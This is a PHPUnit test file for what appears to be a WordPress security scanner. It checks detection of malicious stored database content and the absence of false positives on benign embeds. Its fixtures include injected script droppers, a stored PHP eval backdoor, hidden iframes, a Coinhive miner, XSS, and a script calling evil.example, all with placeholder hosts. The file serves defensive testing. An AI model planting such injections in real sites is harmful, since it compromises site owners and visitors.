<?php
namespace WordGate\Tests\Unit;

use PHPUnit\Framework\TestCase;
use WordGate\Scanner\DatabaseAudit;
use WordGate\Scanner\Signatures;

final class DatabaseScanTest extends TestCase {

	private function sigs() {
		return Signatures::fromFile( __DIR__ . '/../../includes/Scanner/signatures.json', 'content_signatures' );
	}

	public function testAllContentSignaturesCompile() {
		$sigs = $this->sigs();
		$this->assertGreaterThanOrEqual( 8, $sigs->count() );
		$this->assertSame( array(), $sigs->invalid() );
	}

	/**
	 * @dataProvider maliciousContentProvider
	 */
	#[\PHPUnit\Framework\Attributes\DataProvider('maliciousContentProvider')]
	public function testDetectsMaliciousContent( $expectedId, $content, $scope = 'post' ) {
		$ids = array_column( $this->sigs()->scan( $content, $scope ), 'id' );
		$this->assertContains( $expectedId, $ids, 'Got: ' . implode( ', ', $ids ) );
	}

	public static function maliciousContentProvider() {
		return array(
			'fromCharCode dropper'   => array( 'DB.JS.ScriptFromCharCode', '<script>eval(String.fromCharCode(' . implode( ',', array_fill( 0, 30, 104 ) ) . '));</script>', 'post' ),
			'document.write unescape' => array( 'DB.JS.DocumentWriteEval', '<script>document.write(unescape("%3Cscript%20src%3D//evil.example/a.js%3E"));</script>', 'option' ),
			'eval atob'              => array( 'DB.JS.DocumentWriteEval', '<script>eval(atob("YWxlcnQoMSk="));</script>', 'post' ),
			'packed js redirect'     => array( 'DB.JS.PackerRedirect', '<script>eval(function(p,a,c,k,e,d){return p}("window.location=\'https://spam.example\'",10,10,"a|b".split("|"),0,{}))</script>', 'post' ),
			'zero size iframe'       => array( 'DB.HTML.HiddenIframe', '<iframe src="https://evil.example/tds" width="0" height="0" style="display:none"></iframe>', 'post' ),
			'meta refresh redirect'  => array( 'DB.HTML.MetaRefreshExternal', '<meta http-equiv="refresh" content="0; url=https://phish.example/login">', 'option' ),
			'stored php backdoor'    => array( 'DB.Code.PhpOrEvalStored', '<?php eval(base64_decode("ZWNobyAxOw==")); ?>', 'option' ),
			'raw ip script src'      => array( 'DB.JS.SuspiciousScriptSrc', '<script src="http://203.0.113.99/a.js"></script>', 'post' ),
			'dropper php script src' => array( 'DB.JS.SuspiciousScriptSrc', '<script src="https://bad.example/get.php?v=123"></script>', 'option' ),
			'hidden seo spam'        => array( 'DB.HTML.HiddenSeoSpam', '<div style="position:absolute;left:-9999px"><a href="https://spam.example/1">cheap viagra</a> <a href="https://spam.example/2">online casino</a></div>', 'post' ),
			'cryptominer'            => array( 'DB.JS.Cryptominer', '<script src="https://coinhive.com/lib/coinhive.min.js"></script>', 'option' ),
			'inline xss event'       => array( 'DB.JS.InlineEventXss', '<img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))">', 'post' ),
			'comment script tag'     => array( 'DB.Comment.ScriptOrJsUri', 'Nice post! <script>fetch("https://evil.example")</script>', 'comment' ),
			'comment js author url'  => array( 'DB.Comment.ScriptOrJsUri', "Great article\njavascript:alert(1)", 'comment' ),
		);
	}

	/**
	 * Page builders (Gutenberg, Elementor), legitimate embeds and analytics snippets
	 * must never trigger false positives.
	 *
	 * @dataProvider benignContentProvider
	 */
	#[\PHPUnit\Framework\Attributes\DataProvider('benignContentProvider')]
	public function testAllowsBenignContent( $content, $scope = 'post' ) {
		$this->assertSame( array(), $this->sigs()->scan( $content, $scope ) );
	}

	public static function benignContentProvider() {
		return array(
			'gutenberg blocks'  => array( '<!-- wp:paragraph {"align":"center"} --><p class="has-text-align-center">Hello <strong>world</strong>! <a href="https://example.com/about">Learn more</a></p><!-- /wp:paragraph --><!-- wp:image {"id":42} --><figure class="wp-block-image"><img src="https://example.com/wp-content/uploads/2026/01/hero.jpg" alt="Hero" /></figure><!-- /wp:image -->', 'post' ),
			'elementor markup'  => array( '<div class="elementor-widget-container" data-settings="{&quot;animation&quot;:&quot;fadeIn&quot;}"><section class="elementor-section"><div class="elementor-column"><a class="elementor-button" href="https://example.com/contact">Contact us</a></div></section></div>', 'post' ),
			'youtube embed'     => array( '<iframe width="560" height="315" src="https://www.youtube.com/embed/dQw4w9WgXcQ" title="YouTube video player" frameborder="0" allowfullscreen></iframe>', 'post' ),
			'vimeo embed'       => array( '<iframe src="https://player.vimeo.com/video/123456789" width="640" height="360" frameborder="0" allow="autoplay; fullscreen"></iframe>', 'post' ),
			'ga4 analytics'     => array( '<script async src="https://www.googletagmanager.com/gtag/js?id=G-ABC123456"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag("js",new Date());gtag("config","G-ABC123456");</script>', 'option' ),
			'gtm noscript iframe' => array( '<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-XXXX" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>', 'option' ),
			'normal comment'    => array( "Thanks for sharing this tutorial! Check out my blog.\nhttps://example.org/blog", 'comment' ),
		);
	}

	public function testSiteUrlOptionTamperingReportedCritical() {
		// Clean baseline.
		$clean = array( 'siteurl' => 'https://example.com', 'home' => 'https://example.com' );
		$this->assertSame( array(), DatabaseAudit::checkSiteUrls( $clean, null ) );
		$this->assertSame( array(), DatabaseAudit::checkSiteUrls( $clean, $clean, $clean ) );

		// javascript: / script injection in siteurl.
		$injected = DatabaseAudit::checkSiteUrls( array( 'siteurl' => 'javascript:alert(1)', 'home' => 'https://example.com' ) );
		$this->assertCount( 1, $injected );
		$this->assertSame( 'critical', $injected[0]['severity'] );
		$this->assertSame( 'option_url_tampered', $injected[0]['type'] );

		// Host mismatch against WP_HOME constant.
		$constMismatch = DatabaseAudit::checkSiteUrls(
			array( 'siteurl' => 'https://example.com', 'home' => 'https://evil.example' ),
			null,
			array( 'home' => 'https://example.com' )
		);
		$this->assertCount( 1, $constMismatch );
		$this->assertSame( 'critical', $constMismatch[0]['severity'] );

		// Unexpected domain change vs previous scan.
		$changed = DatabaseAudit::checkSiteUrls(
			array( 'siteurl' => 'https://hijacked.example', 'home' => 'https://example.com' ),
			$clean
		);
		$this->assertCount( 1, $changed );
		$this->assertSame( 'critical', $changed[0]['severity'] );
		$this->assertSame( 'option_url_changed', $changed[0]['type'] );
	}
}
